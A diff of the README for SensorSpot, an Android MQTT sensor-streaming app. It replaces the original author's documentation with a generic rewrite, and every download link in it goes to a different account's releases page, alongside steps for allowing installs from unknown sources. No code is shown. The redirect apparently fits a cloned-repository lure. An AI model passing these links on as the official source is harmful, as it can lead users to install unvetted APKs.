@@ -1,101 +1,66 @@
-<div align="center">
+# 🌟 SensorSpot - Stream Your Sensor Data Easily
 
-![GitHub License](https://img.shields.io/github/license/UmerCodez/SensorSpot?style=for-the-badge)
-   ![Jetpack Compose Badge](https://img.shields.io/badge/Jetpack%20Compose-4285F4?logo=jetpackcompose&logoColor=fff&style=for-the-badge) ![MQTT](https://img.shields.io/badge/protocol-mqtt_v5-green?style=for-the-badge) ![Android](https://img.shields.io/badge/Android%205.0+-3DDC84?style=for-the-badge&logo=android&logoColor=white) ![GitHub Release](https://img.shields.io/github/v/release/UmerCodez/SensorSpot?include_prereleases&style=for-the-badge) ![Material 3](https://img.shields.io/badge/Material%203-ebe89d?style=for-the-badge&logo=materialdesign&logoColor=white)
+## 📥 Download Now
+[![Download SensorSpot](https://img.shields.io/badge/Download-SensorSpot-blue.svg)](https://github.com/Aditya-narwariya/SensorSpot/releases)
 
-[<img src="https://github.com/user-attachments/assets/0f628053-199f-4587-a5b2-034cf027fb99" height="100">](https://github.com/UmerCodez/SensorSpot/releases) [<img src="https://github.com/user-attachments/assets/f311c689-cfd1-4326-8e7d-323e2e117006" height="100">](https://apt.izzysoft.de/fdroid/index/apk/com.github.umercodez.sensorspot)  
+## 📖 Description
+SensorSpot is an Android app designed to help you stream real-time device sensor data to an MQTT broker. With SensorSpot, you can select sensors, configure broker settings, and publish data seamlessly. This app makes monitoring your sensor data simple and efficient, even for those without technical backgrounds.
 
+## 🛠️ Features
+- **Real-Time Streaming**: Get live updates from your device sensors.
+- **User-Friendly Interface**: Simple navigation for easy configuration.
+- **Multiple Sensor Support**: Choose from a variety of sensors.
+- **MQTT Broker Configuration**: Customize settings for your data stream.
+- **Data Publishing**: Seamlessly send data to your broker.
+- **Compatibility**: Works on most Android devices.
 
-# Sensor Spot
-## Android app to stream real-time device sensor data to an [MQTT](https://mqtt.org/) broker. Select sensors, configure broker settings, and publish seamlessly.
+## 🚀 Getting Started
+To start using SensorSpot, follow these simple steps:
 
+1. **Download SensorSpot**: Click the link below to visit the Releases page.
+   [Download SensorSpot](https://github.com/Aditya-narwariya/SensorSpot/releases)
 
-<img src="https://github.com/UmerCodez/SensorSpot/blob/main/fastlane/metadata/android/en-US/images/phoneScreenshots/1.jpg" width="250" heigth="250"> <img src="https://github.com/UmerCodez/SensorSpot/blob/main/fastlane/metadata/android/en-US/images/phoneScreenshots/3.jpg" width="250" heigth="250"> <img src="https://github.com/UmerCodez/SensorSpot/blob/main/fastlane/metadata/android/en-US/images/phoneScreenshots/2.jpg" width="250" heigth="250"> <img src="https://github.com/UmerCodez/SensorSpot/blob/main/fastlane/metadata/android/en-US/images/phoneScreenshots/4.jpg" width="250" heigth="250">
+2. **Select the Latest Release**: On the Releases page, find the latest version of SensorSpot.
 
+3. **Download the APK File**: Click on the download link for the APK file for your Android device.
 
-</div>
+4. **Install the App**:
+   - Open the downloaded APK file.
+   - If prompted, allow installations from unknown sources in your device's settings.
+   - Follow the on-screen instructions to complete the installation.
 
-⚠️ _The App only supports **MQTT v5** for now_
+5. **Launch SensorSpot**: Find the app in your app drawer and tap to open.
 
-## Usage
+## ⚙️ System Requirements
+- **Device**: Android version 6.0 (Marshmallow) or higher.
+- **Storage**: At least 50 MB free space.
+- **Network**: Internet connection for MQTT broker access.
 
-1. Configure your broker settings.
-2. Press **Connect** to start streaming the selected sensor data in real time.
-3. App allows user to select or deselect sensors **while connected**, with the published data automatically updating to reflect the new choices.
+## ⚡ Using SensorSpot
+Once you have installed SensorSpot, follow these steps to start streaming your sensor data:
 
+1. **Select Your Sensors**: Open the app and choose which sensors you want to stream data from.
 
-The data is published to the topic `android/sensor` in the following JSON format:
+2. **Configure MQTT Broker**:
+   - Enter the hostname or IP address of your MQTT broker.
+   - Input your broker's port number (default is usually 1883).
+   - If required, provide user authentication details.
 
-```json
-{
-  "type": "android.sensor.accelerometer",
-  "timestamp": 3925657519043709,
-  "values": [0.31892395, -0.97802734, 10.049896]
-}
-```
-This format is similar to one used in [SensaGram](https://github.com/UmerCodez/SensaGram)
-<div align="center">
-   
-<img width="282" height="341" alt="image" src="https://github.com/user-attachments/assets/4742b447-3713-417a-b3aa-d06903f30a7a" />
+3. **Start Streaming**: Tap the 'Start' button to begin streaming your selected sensor data. You can monitor the data in real time on your connected devices.
 
-</div>
+## 🔧 Troubleshooting
+If you encounter any issues while using SensorSpot, here are some common solutions:
 
-### Explanation
+- **Installation Issues**: If installation fails, ensure that you have allowed installations from unknown sources in your device settings.
 
-| Array Item | Description                                                 |
-| ---------- | ----------------------------------------------------------- |
-| values\[0] | Acceleration force along the **x-axis** (including gravity) |
-| values\[1] | Acceleration force along the **y-axis** (including gravity) |
-| values\[2] | Acceleration force along the **z-axis** (including gravity) |
+- **Connection Problems**: Check your internet connection and verify that the MQTT broker settings are correct.
 
-* **timestamp**: The time (in nanoseconds) when the event occurred. See the [timestamp](https://developer.android.com/reference/android/hardware/SensorEvent#timestamp).
+- **Sensor Data Not Displaying**: Make sure the selected sensors are enabled and that you have granted the app the necessary permissions.
 
-**Note**: For more details about other sensors data and what the `values` array represent, refer to the official Android documentation:
+## 💬 Support
+If you need further assistance, feel free to reach out through the issues section on our GitHub repository. We are here to help you troubleshoot any challenges you may encounter.
 
-* [Motion sensors](https://developer.android.com/guide/topics/sensors/sensors_motion)
-* [Position sensors](https://developer.android.com/guide/topics/sensors/sensors_position)
-* [Environmental sensors](https://developer.android.com/guide/topics/sensors/sensors_environment)
+## 📥 Download & Install
+To get started with SensorSpot, [visit this page to download](https://github.com/Aditya-narwariya/SensorSpot/releases). Ensure you choose the latest APK file for the best experience.
 
-  
-## GPS data format
-GPS data is sent in following json format
-```json
-{
-  "type": "android.gps",
-  "longitude": 155.9011,
-  "latitude": 81.4278,
-  "altitude": 217.5,
-  "bearing": 135.0,
-  "accuracy": 5.2,
-  "speed": 2.8,
-  "time": 1727845963000
-}
-```
-where:
-
-| Field       | Description                                                                                                            |
-|-------------|------------------------------------------------------------------------------------------------------------------------|
-| longitude   | Longitude in degrees.                                                                                                 |
-| latitude    | Latitude in degrees.                                                                                                  |
-| altitude    | The altitude of the location in meters above the WGS84 reference ellipsoid.                                         |
-| bearing     | Bearing at the time of this location in degrees. Bearing is the horizontal direction of travel and is unrelated to device orientation. The bearing is guaranteed to be in the range \[0, 360). |
-| accuracy    | Estimated horizontal accuracy radius in meters of this location at the 68th percentile confidence level.           |
-| speed       | Speed at the time of this location in meters per second.                                                            |
-| time        | The Unix epoch time of this location fix, in milliseconds since the start of the Unix epoch (00:00:00 January 1, 1970 UTC). |
-
-### Limitation on Android 14+ devices
-Starting with Android 14, background execution restrictions are more strict. When you connect to the broker, the app starts a foreground service to publish sensor data in real time. However, if you leave the app for more than 5 seconds (e.g., switch to another app or close it), the system may stop this foreground service, causing a disconnection from the broker. This occurs even if background activity is allowed for the app.
-
-To avoid this issue, keep the app running in the foreground while connected.
-
-## ⭐️ Support
-
-Appreciate the project? Here's how you can help:
-
-1. **Star**: Give it a star at the top right. It means a lot!
-2. **Contribute**: Found an issue or have a feature idea? Submit a PR.
-3. **Feedback**: Have suggestions? Open an issue or start a discussion.
-
-
-
-
+Enjoy streaming your sensor data with ease using SensorSpot!
